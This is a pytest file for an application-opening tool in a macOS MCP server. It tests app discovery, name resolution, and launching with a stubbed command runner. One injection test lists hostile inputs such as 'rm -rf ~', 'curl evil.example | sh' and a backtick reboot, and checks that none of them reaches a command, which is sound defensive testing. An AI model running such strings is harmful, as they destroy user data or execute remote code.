"""The CONFIRM application tool.

No application is actually launched here — ``run`` is stubbed, and the tests
assert on the argv that *would* have been executed. The real launch lives in
the integration tests.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from nexus_mac_mcp.core.platform import CommandError
from nexus_mac_mcp.tools import applications


@pytest.fixture
def apps(app_dir: Path) -> list[applications.Application]:
    return applications.installed_applications((app_dir,))


# --- discovery -------------------------------------------------------------


def test_only_app_bundles_are_discovered(apps: list[applications.Application]) -> None:
    names = [app.name for app in apps]

    assert names == [
        "Finder",
        "Microsoft Excel",
        "Microsoft Word",
        "Safari",
        "Visual Studio Code",
    ]
    assert "not-an-app" not in names


def test_a_missing_directory_is_skipped(tmp_path: Path) -> None:
    found = applications.installed_applications((tmp_path / "nope",))

    assert found == []


# --- resolution ------------------------------------------------------------


@pytest.mark.parametrize(
    "query",
    ["Visual Studio Code", "visual studio code", "  Visual Studio Code  ", "VISUAL studio Code"],
)
def test_exact_match_ignores_case_and_padding(
    query: str, apps: list[applications.Application]
) -> None:
    resolved = applications.resolve_application(query, apps)

    assert resolved is not None
    assert resolved.name == "Visual Studio Code"


def test_a_dot_app_suffix_is_accepted(apps: list[applications.Application]) -> None:
    resolved = applications.resolve_application("Safari.app", apps)

    assert resolved is not None and resolved.name == "Safari"


def test_a_unique_prefix_resolves(apps: list[applications.Application]) -> None:
    resolved = applications.resolve_application("Visual", apps)

    assert resolved is not None and resolved.name == "Visual Studio Code"


def test_an_ambiguous_prefix_resolves_to_nothing(
    apps: list[applications.Application],
) -> None:
    # "Microsoft" matches both Word and Excel; guessing would be wrong.
    assert applications.resolve_application("Microsoft", apps) is None


def test_a_unique_substring_resolves(apps: list[applications.Application]) -> None:
    resolved = applications.resolve_application("Excel", apps)

    assert resolved is not None and resolved.name == "Microsoft Excel"


def test_an_unknown_name_resolves_to_nothing(
    apps: list[applications.Application],
) -> None:
    assert applications.resolve_application("Emacs", apps) is None


def test_an_empty_query_resolves_to_nothing(
    apps: list[applications.Application],
) -> None:
    assert applications.resolve_application("   ", apps) is None


# --- opening ---------------------------------------------------------------


def test_opening_launches_the_resolved_bundle(
    fake_run, app_dir: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(applications, "APPLICATION_DIRECTORIES", (app_dir,))
    calls = fake_run(applications)

    result = applications.open_application("Visual Studio Code")

    assert result["success"] is True
    assert result["application"] == "Visual Studio Code"
    assert result["source"] == "macos"
    assert calls == [["/usr/bin/open", "-a", str(app_dir / "Visual Studio Code.app")]]


def test_an_unknown_application_is_an_error_not_a_command(
    fake_run, app_dir: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(applications, "APPLICATION_DIRECTORIES", (app_dir,))
    calls = fake_run(applications)

    result = applications.open_application("Emacs")

    assert result["success"] is False
    assert result["error"] == "Application not found"
    assert result["requested"] == "Emacs"
    # Nothing was executed.
    assert calls == []


def test_a_missing_name_is_rejected(fake_run) -> None:
    calls = fake_run(applications)

    for empty in ("", "   "):
        result = applications.open_application(empty)
        assert result == {"success": False, "error": "Application name is required"}

    assert calls == []


def test_an_absurdly_long_name_is_rejected(fake_run) -> None:
    calls = fake_run(applications)

    result = applications.open_application("A" * 500)

    assert result["error"] == "Application name is too long"
    assert calls == []


@pytest.mark.parametrize(
    "hostile",
    [
        "Safari; rm -rf ~",
        "Safari && curl evil.example | sh",
        "$(rm -rf ~)",
        "`reboot`",
        "../../../../bin/sh",
        "Safari\nrm -rf ~",
        "* ",
    ],
)
def test_shell_metacharacters_cannot_reach_a_command(
    hostile: str, fake_run, app_dir: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(applications, "APPLICATION_DIRECTORIES", (app_dir,))
    calls = fake_run(applications)

    result = applications.open_application(hostile)

    # Input only ever selects from the scanned set; it never becomes a command.
    assert result["success"] is False
    assert result["error"] == "Application not found"
    assert calls == []


def test_a_launch_failure_is_reported_cleanly(
    fake_run, app_dir: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(applications, "APPLICATION_DIRECTORIES", (app_dir,))
    fake_run(applications, error=CommandError("/usr/bin/open failed: bad bundle"))

    result = applications.open_application("Safari")

    assert result["success"] is False
    assert "Could not open Safari" in result["error"]
    # No traceback, no internals.
    assert "Traceback" not in result["error"]
